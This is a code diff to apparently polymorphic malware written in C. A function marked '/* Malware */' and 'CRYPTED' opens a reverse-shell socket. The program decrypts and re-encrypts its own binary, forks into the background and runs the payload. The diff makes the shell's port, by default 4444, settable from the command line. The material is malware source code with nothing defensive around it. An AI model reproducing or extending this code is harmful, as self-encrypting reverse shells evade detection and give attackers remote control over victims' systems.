@@ -1,5 +1,6 @@
 
 #include "polymorph.h"
+#include <stdlib.h>
 
 static int get_file_size(int fd) {
   struct stat _infos;
@@ -52,9 +53,9 @@ static char *generate_key(unsigned char *p, int size) {
 }
 
 /* Malware */
-CRYPTED(CODE) void payload(void) {
+CRYPTED(CODE) void payload(int portav) {
   int sockt;
-  int port = 4444;
+  int port = portav;
   struct sockaddr_in revsockaddr;
 
   sockt = socket(AF_INET, SOCK_STREAM, 0);
@@ -145,6 +146,10 @@ int run_alone(void) {
 /* main */
 int main(int ac, char const *const *av) {
   crypter_t *crypter = read_bin(av[0]);
+  int port = 4444;
+  if (av[1]) {
+    port = atoi(av[1]);
+  };
 
   if (first_time == true) /* Init a first-time key */
     remove_first_time(crypter);
@@ -152,7 +157,7 @@ int main(int ac, char const *const *av) {
   decode_and_crypt(crypter);             /* Decode 😇 */
   if (fork())
     exit(0);
-  payload(); /* 😈 */
+  payload(port); /* 😈 */
   run_alone();
   return (0);
 }
